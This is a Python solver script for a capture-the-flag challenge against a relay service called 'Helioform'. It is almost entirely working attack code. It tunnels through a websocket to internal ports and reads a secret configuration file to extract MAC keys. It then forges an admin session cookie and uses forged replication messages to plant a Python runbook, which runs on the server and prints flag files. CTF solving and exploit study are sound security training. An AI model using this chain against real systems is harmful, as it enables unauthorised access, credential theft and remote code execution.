#!/usr/bin/env python3
"""Helioform Relay 4.2 — end-to-end solver (stdlib only).

Usage: HELIO_HOST=w05.ctf.chronos-security.ro HELIO_PORT=32977 python -u solve_helio.py
"""
import base64
import hashlib
import hmac
import json
import os
import re
import socket
import struct
import time
import urllib.request

HOST = os.environ.get("HELIO_HOST", "w05.ctf.chronos-security.ro")
PORT = int(os.environ.get("HELIO_PORT", "32977"))
BASE = "http://%s:%d" % (HOST, PORT)
MAGIC = b"HSP1"
PEER = "relay-collector"
RUNBOOK = "/var/lib/helioform/runbooks/00-compliance"
PY = b"""HSP-RUNBOOK
import glob
for pat in ["/flag", "/flag.txt", "/root/flag*", "/home/*/flag*", "/etc/flag*"]:
    for q in glob.glob(pat):
        try:
            print(open(q).read())
        except Exception:
            pass
"""


def hsp(op, body=b"", flags=0):
    return MAGIC + struct.pack("<HHI", op, flags, len(body)) + body


def agent():
    s = socket.create_connection((HOST, PORT), timeout=8)
    key = base64.b64encode(os.urandom(16)).decode()
    s.sendall((
        "GET /mesh HTTP/1.1\r\nHost: x\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
        "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n"
        "Sec-WebSocket-Protocol: hsp.raw.1\r\n\r\n" % key).encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = s.recv(4096)
        if not chunk:
            break
        buf += chunk
    return s


def read_frame(s, timeout=3.0):
    s.settimeout(timeout)
    buf = b""
    while len(buf) < 12:
        chunk = s.recv(4096)
        if not chunk:
            return None, b""
        buf += chunk
    op, _flags, length = struct.unpack("<HHI", buf[4:12])
    while len(buf) < 12 + length:
        chunk = s.recv(4096)
        if not chunk:
            break
        buf += chunk
    return op, buf[12:12 + length]


def dial(port):
    s = agent()
    s.sendall(hsp(0x10, b"127.0.0.1:%d" % port))
    read_frame(s, 2.0)
    return s


def ticket():
    s = dial(7710)
    s.sendall(hsp(0x01))
    _op, body = read_frame(s)
    nonce = [ln.split(b"=", 1)[1] for ln in body.split(b"\n") if ln.startswith(b"nonce=")][0]
    s.sendall(hsp(0x20, nonce))
    _op, body = read_frame(s)
    s.close()
    return [ln.split(b"=", 1)[1] for ln in body.split(b"\n") if ln.startswith(b"ticket=")][0].decode()


def provd(tk, path):
    s = dial(7711)
    s.sendall(hsp(0x30, ("ticket=%s\npath=%s\n" % (tk, path)).encode()))
    _op, body = read_frame(s)
    s.close()
    return body.decode(errors="replace")


def status(tk):
    s = dial(7712)
    s.sendall(hsp(0x40, ("ticket=%s\n" % tk).encode()))
    _op, body = read_frame(s)
    s.close()
    fields = dict(ln.split("=", 1) for ln in body.decode(errors="replace").splitlines() if "=" in ln)
    return int(fields["epoch"]), bytes.fromhex(fields["tip"]), bytes.fromhex(fields["bind"])


def write_stream(tk, stream_id, body, repl_key):
    epoch, tip, bind = status(tk)
    canon = "hsp-repl/1|hello|%d|%s|%s" % (epoch, tip.hex(), PEER)
    mac = hmac.new(repl_key, canon.encode(), hashlib.sha256).digest()
    name = PEER.encode()
    hello = struct.pack("<H", len(name)) + name + struct.pack("<I", epoch) + tip + mac
    sid = stream_id.encode()
    canon = "hsp-repl/1|blob|%d|%s|%s|%s|%s" % (
        epoch, tip.hex(), bind.hex(), stream_id, hashlib.sha256(body).hexdigest())
    mac = hmac.new(repl_key, canon.encode(), hashlib.sha256).digest()
    blob = (struct.pack("<H", len(sid)) + sid + bytes([0x01]) + struct.pack("<I", epoch) + tip + bind +
            struct.pack("<I", len(body)) + body + mac)
    s = dial(7713)
    s.sendall(hsp(0x11, hello))
    read_frame(s, 2.0)
    s.sendall(hsp(0x17, blob))
    _op, reply = read_frame(s, 3.0)
    s.close()
    return reply


def cookie(iss, aud, key):
    payload = base64.urlsafe_b64encode(json.dumps({
        "iss": iss, "aud": aud, "role": "admin", "exp": int(time.time()) + 3600,
    }, separators=(",", ":")).encode()).decode().rstrip("=")
    mac = hmac.new(key.encode(), payload.encode(), hashlib.sha256).hexdigest()
    return "hsp_session=%s.%s" % (payload, mac)


def main():
    tk = ticket()
    print("[+] mesh ticket", tk[:28])
    env = provd(tk, "/etc/helioform/relay.env")
    values = dict(ln.split("=", 1) for ln in env.splitlines() if "=" in ln and not ln.startswith("#"))
    console_key = values["CONSOLE_MAC_KEY"]
    repl_key = values["REPLICATION_MAC_KEY"].encode()
    iss, aud = values["CONSOLE_ISS"], values["CONSOLE_AUD"]
    print("[+] keys: console", console_key, "replication", values["REPLICATION_MAC_KEY"])
    ck = cookie(iss, aud, console_key)
    with urllib.request.urlopen(urllib.request.Request(BASE + "/console/automation", headers={"Cookie": ck}), timeout=8) as r:
        page = r.read().decode()
    print("[+] console admin OK, dir =", re.search(r'runbook-dir">([^<]+)', page).group(1))
    print("[*] writing runbook", RUNBOOK)
    print("[*] recordd:", write_stream(tk, RUNBOOK, PY, repl_key))
    flag = None
    for _ in range(8):
        time.sleep(4)
        with urllib.request.urlopen(urllib.request.Request(BASE + "/console/automation", headers={"Cookie": ck}), timeout=8) as r:
            page = r.read().decode()
        out = re.search(r'runbook-output">(.*?)</pre>', page, re.S)
        text = out.group(1) if out else ""
        m = re.search(r"CSCTF\{[^}]+\}", text)
        if m:
            flag = m.group(0)
            break
    print("[+] output:", (text or "")[:400].replace("\n", " | "))
    print("[+] FLAG:", flag)


if __name__ == "__main__":
    main()
